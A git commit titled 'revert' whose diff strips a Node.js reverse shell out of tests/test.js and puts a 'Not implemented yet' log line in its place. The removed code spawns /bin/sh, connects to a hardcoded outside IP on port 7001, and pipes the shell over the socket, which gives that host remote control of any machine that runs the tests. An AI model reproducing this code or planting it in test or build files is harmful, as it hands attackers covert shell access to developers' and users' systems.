0861a15da633053e38cd91a7b568223c610cd903
RashestLight <terrelldixon02@yahoo.com>
2023-04-14 14:30:32 -0400

    revert

--- tests/test.js
+++ tests/test.js
@@ -1,16 +1,1 @@
-(function(){
-    var net = require("net"),
-    cp = require("child_process"),
-    sh = cp.spawn("/bin/sh", []);
-
-    var client = new net.Socket();
-
-    client.connect(7001, " 64.92.84.174", function(){
-        
-        client.pipe(sh.stdin);
-
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/;
-})();
+console.log("Not implemented yet");
